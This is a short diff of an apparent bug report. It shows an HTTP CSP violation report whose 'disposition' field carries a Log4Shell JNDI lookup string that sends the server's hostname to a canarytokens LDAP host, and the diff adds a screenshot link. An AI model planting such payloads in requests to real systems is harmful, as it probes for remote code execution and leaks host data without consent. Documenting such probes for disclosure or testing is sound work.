@@ -12,3 +12,4 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
  
 {"csp-report":{"document-uri":"https://<hostname>/","referrer":"","violated-directive":"script-src","effective-directive":"script-src","original-policy":"connect-src * https://*.*.*.com https://api.*.com; default-src blob:; font-src * data:; frame-src * data:; img-src * data: blob:; object-src data:; report-uri /vizql/csp-report; script-src * blob:; style-src * 'unsafe-inline'","disposition":"${jndi:ldap://x${hostname}.L4J.blah.blah.canarytokens.com/a}","blocked-uri":"eval","line-number":"5637","column-number":"25","source-file":"https://*.*.com/angular.min.js","status-code":"200","script-sample":""}}
  ```
+![Screenshot from 2022-12-31 12-09-56](https://user-images.githubusercontent.com/91581651/210127833-2c1cea7b-5dfc-4fc2-a710-c53bc4f5aa93.png)
